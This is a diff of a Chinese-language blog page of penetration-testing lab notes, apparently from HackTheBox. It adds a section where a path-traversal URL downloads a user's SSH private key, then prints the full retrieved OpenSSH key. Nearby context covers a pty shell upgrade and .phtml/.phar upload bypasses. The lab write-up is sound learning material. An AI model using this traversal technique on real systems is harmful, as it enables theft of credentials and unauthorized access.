@@ -56,7 +56,7 @@ Bash 逃逸 在获得初始立足点后常常 bash 的交互性并不完善，�
 python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。">
   <meta itemprop="datePublished" content="2025-12-27T17:29:33+08:00">
   <meta itemprop="dateModified" content="2025-12-27T17:29:33+08:00">
-  <meta itemprop="wordCount" content="292">
+  <meta itemprop="wordCount" content="322">
   <meta itemprop="keywords" content="Hack,技术">
 
   <meta name="twitter:card" content="summary">
@@ -171,6 +171,7 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
         <li><a href="#idor-不安全直接对象引用">IDOR 不安全直接对象引用</a></li>
         <li><a href="#关于文件上传">关于文件上传</a></li>
         <li><a href="#添加-hosts-记录">添加 hosts 记录</a></li>
+        <li><a href="#关于-id_rsa">关于 id_rsa</a></li>
       </ul>
     </li>
   </ul>
@@ -243,7 +244,18 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
 <p>有些表单原本只可以上传 jpg、git、png 等图片格式文件，为什么最终却可以上传 .phtml 和 .phar 格式文件呢？因为 .phtml 和 .phar 两种文件格式比较特殊，.phtml 是一种 PHP 常规拓展名，早期较为常见，现在虽然使用较少但依旧默认会被 PHP 引擎解析，这使得攻击者能够通过上传该格式的文件直接执行恶意 PHP 代码。而 .phar 更加特殊，它本质上是 PHP 的归档文件格式（PHP Archive），也可以执行。</p>
 <h3 id="添加-hosts-记录">添加 hosts 记录</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.187.74 conversor.htb&#34; &gt;&gt; /etc/hosts&#39;</span>
-</span></span></code></pre></div>
+</span></span></code></pre></div><h3 id="关于-id_rsa">关于 id_rsa</h3>
+<p>访问 <code>http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/id_ed25519</code> 尝试下载他们的 <code>id_rsa</code> 文件</p>
+<pre tabindex="0"><code class="language-id_rsa" data-lang="id_rsa">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDPFoJGv5
+iCd2KL8Mk98VRJAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIJhikYx00CYMUNJ
+bkfs15NSAgTKVW07Aw2N4nxQ/RZ6AAAAoAj0NoVnW97AXPxNpphTUEKgehTfW3KWvX/9ps
+AvdkbwNKeW1F/CkRpsFkmcc1/cvTrzBueLfuJI/2Cm8RB55xHgkJNtkk9Fc3HLRF8Z/kZC
+Mn8NP3Z2qOuHzSO5yoqU2mFiFBouc56nWkR50JElA2z0L65KU81xDPB3YVujEf/yxbvoxJ
+ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><p>值得注意的是，下载 <code>id_rsa</code> 是失败的，需要下载 <code>id_ed25519</code>；<code>id_ed25519</code> 是现代 SSH 推荐的 Ed25519 算法私钥文件。</p>
+
       </div>
     </article>
 
@@ -269,7 +281,7 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        292 Words
+        322 Words
       </p>
 
       <p>
